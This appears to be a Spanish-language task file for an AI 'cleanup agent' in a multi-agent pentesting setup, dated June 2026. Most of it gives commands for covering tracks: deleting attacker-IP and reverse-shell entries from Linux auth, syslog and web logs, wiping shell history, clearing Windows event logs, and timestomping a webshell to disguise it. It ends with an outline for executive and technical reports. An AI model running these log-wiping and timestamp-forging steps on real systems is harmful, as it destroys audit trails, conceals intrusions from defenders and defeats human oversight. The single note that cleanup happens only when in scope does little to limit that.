# Tareas Específicas: CLEANUP-AGENT

## Objetivo Principal

Eliminar evidencia de la actividad realizada y generar informe técnico
completo del pentesting.

**NOTA**: En pentesting profesional, la limpieza se realiza solo si está
en alcance. El objetivo principal es la documentación y remediación.

---

## Tareas Asignadas

### Fase 5A: Limpieza de Logs

#### 1.1 Logs del Sistema (Linux)
**Objetivo**: Eliminar o modificar entradas en logs del sistema.

```bash
# Limpiar auth.log (intentos de login)
sed -i '/ATTACKER_IP/d' /var/log/auth.log

# Limpiar comandos ejecutados
sed -i '/cmd_used/d' ~/.bash_history
cat /dev/null > ~/.bash_history

# Limpiar syslog
sed -i '/attacker_script/d' /var/log/syslog

# Limpiar cron log
sed -i '/reverse_shell/d' /var/log/cron
```

#### 1.2 Logs de Sistema (Windows)
**Objetivo**: Limpiar Event Logs.

```powershell
# Limpiar Security log
wevtutil cl Security

# Limpiar System log
wevtutil cl System

# Limpiar Application log
wevtutil cl Application

# Limpiar PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

#### 1.3 Logs de Aplicaciones Web
**Objetivo**: Limpiar requests de ataque de logs web.

```bash
# Apache access log
sed -i '/sqlmap/d' /var/log/apache2/access.log
sed -i '/nmap_scan/d' /var/log/apache2/access.log

# Nginx access log
sed -i '/ATTACKER_IP/d' /var/log/nginx/access.log
```

---

### Fase 5B: Eliminación de Artefactos

#### 2.1 Webshells y Backdoors
**Objetivo**: Remover archivos de persistencia.

```bash
# Webshells
rm -f /var/www/html/webshell.php
rm -f /var/www/html/uploads/shell.php

# Binarios
rm -f /tmp/.exploit
rm -f /dev/shm/.backdoor

# Scripts
rm -f /opt/scripts/persist.sh
```

#### 2.2 Usuarios Creados
**Objetivo**: Eliminar cuentas de administración ocultas.

```bash
# Linux
userdel -r secretadmin

# Windows
net user secretadmin /delete
```

#### 2.3 Cron Jobs y Servicios
**Objetivo**: Remover tareas programadas.

```bash
# Limpiar crontab
crontab -r

# O remover entradas específicas
crontab -l | grep -v reverse_shell | crontab -

# Windows
schtasks /delete /tn "Updater" /f
```

---

### Fase 5C: Timestomp

#### 3.1 Manipulación de Timestamps (Linux)
**Objetivo**: Ocultar rastro de modificación de archivos.

```bash
# Sincronizar timestamps con archivo legítimo
touch -r /bin/ls /var/www/html/webshell.php

# Usar herramientas específicas
timestomp -v /var/www/html/shell.php -r /etc/passwd
```

---

### Fase 5D: Informe Final

#### 4.1 Informe Ejecutivo
**Objetivo**: Resumen para stakeholders no técnicos.

**Contenido**:
- Resumen de la auditoría
- Riesgos encontrados (críticos, altos, medios, bajos)
- Impacto potencial en el negocio
- Recomendaciones generales
- Próximos pasos

#### 4.2 Informe Técnico
**Objetivo**: Detalle completo para el equipo técnico.

**Contenido por hallazgo**:
- Descripción de la vulnerabilidad
- Pasos de reproducción exactos
- PoC funcional (comandos, payloads, requests)
- Evidencia (screenshots, logs, outputs)
- Clasificación CVSS
- Recomendación de remediación detallada
- Referencias (CVE, CWE, OWASP)

---

## Checklist de Entregable

- [ ] Logs del sistema limpiados
- [ ] Logs de aplicación limpiados
- [ ] Webshells y backdoors removidos
- [ ] Usuarios creados eliminados
- [ ] Cron jobs / servicios removidos
- [ ] Timestamps restaurados
- [ ] Informe ejecutivo generado
- [ ] Informe técnico generado
- [ ] Recomendaciones de remediación documentadas
- [ ] Coordinación con QA-BROWSER para validación final

---

## Coordinación con Otros Agentes

- **PERSIST-AGENT**: Recibe lista de artefactos a limpiar
- **EXPLOIT-AGENT**: Recibe PoCs y hallazgos para informe
- **SCAN-AGENT**: Recibe vulnerabilidades detectadas
- **QA-BROWSER**: Validación final de remediación

---

*Última actualización: Junio 2026*
